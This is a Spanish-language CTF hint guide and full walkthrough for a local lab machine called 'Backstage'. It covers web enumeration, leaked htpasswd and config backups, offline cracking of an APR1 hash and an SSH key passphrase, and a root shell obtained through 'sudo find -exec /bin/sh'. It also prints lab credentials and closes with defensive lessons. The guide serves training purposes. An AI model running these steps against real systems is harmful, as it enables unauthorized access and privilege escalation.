# 🧭 Guía por pistas — Backstage

Guía de resolución por **pistas progresivas**. Cada etapa tiene tres niveles:

- **Pista 1** — empujón conceptual (qué buscar, sin el cómo).
- **Pista 2** — la técnica o herramienta concreta.
- **Pista 3** — el comando exacto.

Abrí solo la que necesites. Al final está el **walkthrough completo**, colapsado,
para verificar tu solución cuando termines.

> Punto de partida: `http://127.0.0.1:8080` (HTTP) y `ssh -p 2222` (SSH).
> Reemplazá `127.0.0.1:8080` por la IP:puerto que estés usando.

---

## Etapa 0 · Reconocimiento

<details>
<summary><b>Pista 1</b> — ¿por dónde entro?</summary>

Hay dos servicios: un servidor web y SSH. El SSH no te sirve todavía porque no tenés
credenciales. Todo arranca por el **web**. Lo primero siempre es mapear qué hay publicado:
puertos, versión del servidor y, sobre todo, **qué rutas y archivos existen**.

</details>

<details>
<summary><b>Pista 2</b> — herramientas</summary>

- Escaneo de puertos/servicios: `nmap`.
- Descubrimiento de contenido web (directorios y archivos): `gobuster`, `feroxbuster` o `ffuf`.
- No olvides fuzzear **extensiones** típicas de respaldo (`.bak`, `.old`, `.txt`, `.conf`).

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
nmap -sC -sV -p- 127.0.0.1 -oN nmap.txt      # (o la IP del contenedor)

gobuster dir -u http://127.0.0.1:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x bak,old,txt,conf -t 40
```

Fijate qué devuelve **403/401** (protegido) y qué devuelve **200** con listado.

</details>

---

## Etapa 1 · Enumeración de configuración y `.htpasswd`

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

El sitio menciona un **panel interno** y un recordatorio sobre "limpiar respaldos del
último deploy". Dos ideas: (a) habrá un directorio restringido con **autenticación básica**,
y (b) alguien dejó **archivos de respaldo** donde no debía. Los respaldos de configuración
suelen filtrar exactamente lo que protege esa autenticación.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Buscá un directorio con **listado activado** (directory indexing). Ahí dentro puede haber
un respaldo de la configuración de Apache y, peor aún, una copia del archivo de contraseñas
de la *Basic Auth*. Recordá que Apache bloquea por defecto los archivos que empiezan con
`.ht`, pero **no** bloquea una copia llamada `htpasswd.bak`.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
# Directorio restringido (pide usuario/contraseña):
curl -I http://127.0.0.1:8080/internal/        # -> 401 Unauthorized

# Directorio de respaldos con listado:
curl -s http://127.0.0.1:8080/backup/

# Los archivos filtrados:
curl -s http://127.0.0.1:8080/backup/apache-internal.conf.bak
curl -s http://127.0.0.1:8080/backup/htpasswd.bak
```

El `.conf.bak` te dice qué protege el panel y qué usuario del sistema existe.
El `htpasswd.bak` te da un **usuario : hash** para crackear.

</details>

---

## Etapa 2 · Crackeo del hash de la Basic Auth

<details>
<summary><b>Pista 1</b> — qué tenés en la mano</summary>

Tenés una línea `usuario:hash`. Antes de romper nada, **identificá el formato del hash**:
el prefijo te dice el algoritmo. Ese formato es el clásico de los archivos de contraseñas
de Apache.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

El prefijo `$apr1$` es **MD5 de Apache (APR1)**. `john` lo reconoce solo. Usá `rockyou.txt`
como diccionario. Si querés forzar el formato en `john`, es `md5crypt-long`.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
echo 'webadmin:$apr1$...tu_hash...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

Con esa contraseña entrás al panel: `curl -u webadmin:LA_PASS http://127.0.0.1:8080/internal/`
(o en el navegador). Dentro hay una **clave privada SSH**.

</details>

---

## Etapa 3 · Crackeo de la clave SSH y acceso inicial

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

El panel interno expone un `id_rsa`. Bajala. Si intentás usarla directo, te pide una
**passphrase**: la clave está cifrada. Ese es tu segundo hash a romper offline.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Para crackear la passphrase de una clave privada con `john`, primero la convertís a un
hash con `ssh2john`, y después la atacás con `rockyou.txt`. Ojo con los **permisos** de la
clave (`chmod 600`) o SSH la rechaza. El usuario del sistema lo viste en la Etapa 1.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
# bajar la clave (requiere la credencial de la Etapa 2)
curl -s -u webadmin:LA_PASS http://127.0.0.1:8080/internal/id_rsa -o id_rsa
chmod 600 id_rsa

# convertir y crackear la passphrase
ssh2john id_rsa > id_rsa.hash        # o: python3 /usr/share/john/ssh2john.py id_rsa
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash

# acceso inicial
ssh -i id_rsa -p 2222 jmanning@127.0.0.1    # introduce la passphrase crackeada
cat ~/user.txt
```

</details>

---

## Etapa 4 · Escalada de privilegios a root

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

Ya sos un usuario normal. La escalada más común y más barata de revisar: ¿qué podés
ejecutar **como root sin contraseña**? Un solo binario permitido de más alcanza.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Revisá `sudo -l`. Vas a ver un binario con `NOPASSWD`. Consultá **GTFOBins** para ese
binario: muchos permiten lanzar un shell o leer archivos arbitrarios cuando se corren con
`sudo`. Con eso leés `/root/root.txt` o abrís una shell de root directamente.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find

# GTFOBin de find -> shell de root:
sudo find . -exec /bin/sh \; -quit
# ya sos root:
id
cat /root/root.txt
```

</details>

---

<details>
<summary><h2>🏁 Walkthrough completo (SPOILER — abrí solo para verificar)</h2></summary>

### Reconocimiento
```bash
nmap -sC -sV -p- 127.0.0.1
# 80/tcp  Apache httpd 2.4 (Debian)
# 22/tcp  OpenSSH
gobuster dir -u http://127.0.0.1:8080 -w .../directory-list-2.3-medium.txt -x bak,conf,txt
# /internal  (Status: 401)
# /backup    (Status: 200)  <- listado de directorio
```

### Etapa 1 — config web + .htpasswd filtrado
```bash
curl -s http://127.0.0.1:8080/backup/
# apache-internal.conf.bak   htpasswd.bak
curl -s http://127.0.0.1:8080/backup/apache-internal.conf.bak
#  -> protege /internal con AuthUserFile; usuario de sistema: jmanning
curl -s http://127.0.0.1:8080/backup/htpasswd.bak
#  -> webadmin:$apr1$NPAWqsTu$LmlgcldKMKL2QRZ3uosEw1
```

### Etapa 2 — crackeo del hash APR1
```bash
echo 'webadmin:$apr1$NPAWqsTu$LmlgcldKMKL2QRZ3uosEw1' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# webadmin : chocolate
```

### Etapa 3 — clave SSH + acceso inicial
```bash
curl -s -u webadmin:chocolate http://127.0.0.1:8080/internal/ | grep href
#  -> id_rsa
curl -s -u webadmin:chocolate http://127.0.0.1:8080/internal/id_rsa -o id_rsa
chmod 600 id_rsa

ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# id_rsa : sunshine

ssh -i id_rsa -p 2222 jmanning@127.0.0.1     # passphrase: sunshine
cat ~/user.txt
```

### Etapa 4 — escalada por sudo (GTFOBin find)
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
id            # uid=0(root)
cat /root/root.txt
```

### Resumen de credenciales
| Elemento | Valor |
|:---------|:------|
| Basic Auth | `webadmin:chocolate` |
| Passphrase clave SSH | `sunshine` |
| Usuario SSH | `jmanning` |
| Escalada | `sudo /usr/bin/find` (NOPASSWD) → root |

### Lecciones (lado defensivo)
- No dejar respaldos (`*.bak`) dentro del *webroot*; y desactivar el listado de directorios (`Options -Indexes`).
- El archivo de contraseñas de la Basic Auth debe vivir **fuera** del *webroot* y no tener copias servibles.
- Nunca publicar claves privadas en una app web; y protegerlas con passphrases fuertes (no de diccionario).
- `sudo` debe otorgar solo lo mínimo: binarios como `find`, `vim`, `less`, `awk`, `tar` son *GTFOBins* y equivalen a dar root.

</details>
